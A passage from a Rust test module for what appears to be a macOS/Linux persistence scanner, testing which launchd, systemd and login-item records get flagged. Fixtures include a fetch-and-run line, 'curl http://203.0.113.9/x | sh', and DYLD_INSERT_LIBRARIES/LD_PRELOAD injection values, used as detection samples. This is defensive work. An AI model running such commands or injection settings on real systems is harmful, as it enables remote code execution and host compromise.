            "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
            "curl -fsS https://example.com/health > /var/lib/app/health",
            "curl -s https://example.com/api | jq .",
            "wget -q https://example.com/f.tgz -O /var/lib/app/f.tgz",
            "/usr/bin/rsync -a /var/lib/app/ backup:/srv ",
            "find /var/tmp -type f -mtime +7 -delete",
            "rm -rf /tmp/build-cache",
            "tar czf /var/backups/home.tgz ~/.config /home/alice/.local/share",
            "[ -f ~/.bash_aliases ] && . ~/.bash_aliases",
            "ExecStart=/usr/sbin/sshd -D $SSHD_OPTS",
            "/usr/bin/python3 /usr/lib/app/job.py --sync ",
            "python3 -c 'print(1)'",
            "/usr/bin/base64 /etc/hostname",
            "cd / && ./run.sh",
            "echo ok > /dev/null 2>&1",
            "/usr/bin/timeout 5 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron",
            "curl https://example.com/.well-known/security.txt",
            // Stock shell startup lines.
            "HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history",
            "[[ -f ${ZDOTDIR:-$HOME}/.zkbd/$TERM-$VENDOR ]] && source ${ZDOTDIR:-$HOME}/.zkbd/$TERM-$VENDOR",
            "if [[ -r ${ZDOTDIR:-$HOME}/.zkbd/${TERM}-${VENDOR} ]] ; then",
            "if [ ! -e \"$HOME/.sudo_as_admin_successful\" ] && [ ! -e \"$HOME/.hushlogin\" ] ; then",
            "  for colors in \"$HOME/.dir_colors.$TERM\" \"$HOME/.dircolors.$TERM\" \\",
            "                \"$HOME/.dir_colors\" \"$HOME/.dircolors\"; do",
            "[ -f ~/.fzf.bash ] && source ~/.fzf.bash",
            "source ~/.iterm2_shell_integration.zsh",
            "test -e \"${HOME}/.iterm2_shell_integration.zsh\" && source \"${HOME}/.iterm2_shell_integration.zsh\"",
            "source /Users/alice/.docker/init-zsh.sh || true # Added by Docker Desktop",
            "# curl http://203.0.113.9/x | sh  and /tmp/x and ~/.cache2/y",
            "# see https://example.com/.well-known/x and ~/.cache2",
            "cd /var/lib/app && ./run.sh",
            "VAR=$(curl -s https://example.com/api)",
            "curl -s -o /var/lib/app/f.json https://example.com/f; chmod 600 /var/lib/app/f.json",
            "base64 /etc/hostname",
            "python3 -c 'import json,sys;print(json.load(sys.stdin))'",
            "echo \"a;b\" | grep a",
        ];
        for command in good {
            assert_eq!(suspicious_command(command), None, "{command}");
        }
    }

    fn check(id: &str, record: &Value) -> Option<String> {
        let found: Vec<_> = CHECKS.iter().filter(|c| c.id == id && c.artifact == text(record, "artifact")).collect();
        assert_eq!(found.len(), 1, "{id}");
        (found[0].test)(record)
    }

    #[test]
    fn launchd_dyld_insert_and_systemd_ld_preload() {
        let job = |env: Value| json!({"artifact": "launchd", "label": "com.example.x", "environment": env});
        assert!(check("launchd-dyld-insert", &job(json!({"DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"}))).is_some());
        assert!(check("launchd-dyld-insert", &job(json!({"PATH": "/usr/bin"}))).is_none());
        let unit = |env: &str| json!({"artifact": "systemd-units", "environment": env});
        assert!(check("systemd-ld-preload", &unit("A=1 LD_PRELOAD=/usr/lib/x.so")).is_some());
        assert!(check("systemd-ld-preload", &unit("A=1")).is_none());
    }

    #[test]
    fn apple_label_exemption_and_btm_applications() {
        let job = |scope: &str, program: &str| {
            json!({"artifact": "launchd", "label": "com.apple.CSConfigDotMacCert-x-SharedServices.Agent", "scope": scope,
                   "source_path": "Users/a/Library/LaunchAgents/x.plist", "program": program, "program_arguments": []})
        };
        assert!(check("launchd-apple-label-outside-system", &job("user_agent", "/usr/libexec/x")).is_none());
        assert!(check("launchd-apple-label-outside-system", &job("user_agent", "/System/Library/x")).is_none());
        assert!(check("launchd-apple-label-outside-system", &job("user_agent", "/Users/a/x")).is_some());
        assert!(check("launchd-apple-label-outside-system", &job("local_daemon", "/usr/libexec/x")).is_some());
        let item = |path: &str| json!({"artifact": "btm", "executable_path": path, "team_id": "", "developer_name": "Unknown Developer"});
        assert!(check("btm-item-unsigned", &item("/Applications/Evil.app/Contents/MacOS/x")).is_some());
        assert!(check("btm-item-unsigned", &item("/System/Library/x")).is_none());
    }

    #[test]
    fn executable_text_covers_the_executable_fields_only() {
        let record = json!({"program": "/bin/a", "program_arguments": ["a", "-b"], "standard_out_path": "/var/log/allowed-text"});
        let text = executable_text(&record);
        assert!(text.contains("/bin/a") && text.contains("a -b") && !text.contains("allowed-text"));
    }

    #[test]
    fn launchd_command_keeps_arguments_after_program() {
        let job = json!({"scope": "local_daemon", "program": "/bin/sh", "program_arguments": ["sh", "-c", "curl http://203.0.113.9/x | sh"]});
        assert_eq!(launchd_command(&job), "/bin/sh -c curl http://203.0.113.9/x | sh");
        assert!(launchd_exec(&job, "_daemon").is_some());
    }

    #[test]
    fn launchd_agents_and_daemons_get_their_own_technique() {
        let job = |scope: &str| json!({"scope": scope, "program": "", "program_arguments": ["/usr/bin/curl", "-s", "http://x"]});
        assert!(launchd_exec(&job("user_agent"), "_agent").is_some());
        assert!(launchd_exec(&job("user_agent"), "_daemon").is_none());
        assert!(launchd_exec(&job("local_daemon"), "_daemon").is_some());
    }
}
